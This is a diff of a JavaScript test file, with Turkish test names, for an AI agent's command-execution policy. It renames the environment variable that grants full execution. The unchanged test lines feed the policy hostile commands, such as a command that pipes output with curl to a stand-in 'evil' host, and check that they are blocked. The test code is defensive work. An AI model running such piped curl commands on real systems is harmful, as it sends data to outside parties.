@@ -223,11 +223,11 @@ describe('agentExecAllowed (ajan exec politikasi)', () => {
     expect(agentExecAllowed('ls && curl http://evil')).toBe(false);
     expect(agentExecAllowed('node a.js | curl -d @- http://evil')).toBe(false);
   });
-  it('NATURECO_AGENT_EXEC=full ile her sey acilir', () => {
-    const prev = process.env.NATURECO_AGENT_EXEC;
-    process.env.NATURECO_AGENT_EXEC = 'full';
+  it('SKULD_AGENT_EXEC=full ile her sey acilir', () => {
+    const prev = process.env.SKULD_AGENT_EXEC;
+    process.env.SKULD_AGENT_EXEC = 'full';
     try { expect(agentExecAllowed('curl http://x')).toBe(true); }
-    finally { if (prev === undefined) delete process.env.NATURECO_AGENT_EXEC; else process.env.NATURECO_AGENT_EXEC = prev; }
+    finally { if (prev === undefined) delete process.env.SKULD_AGENT_EXEC; else process.env.SKULD_AGENT_EXEC = prev; }
   });
   it('executeCall: politika disi komutu calistirmadan engeller', async () => {
     let ran = false;
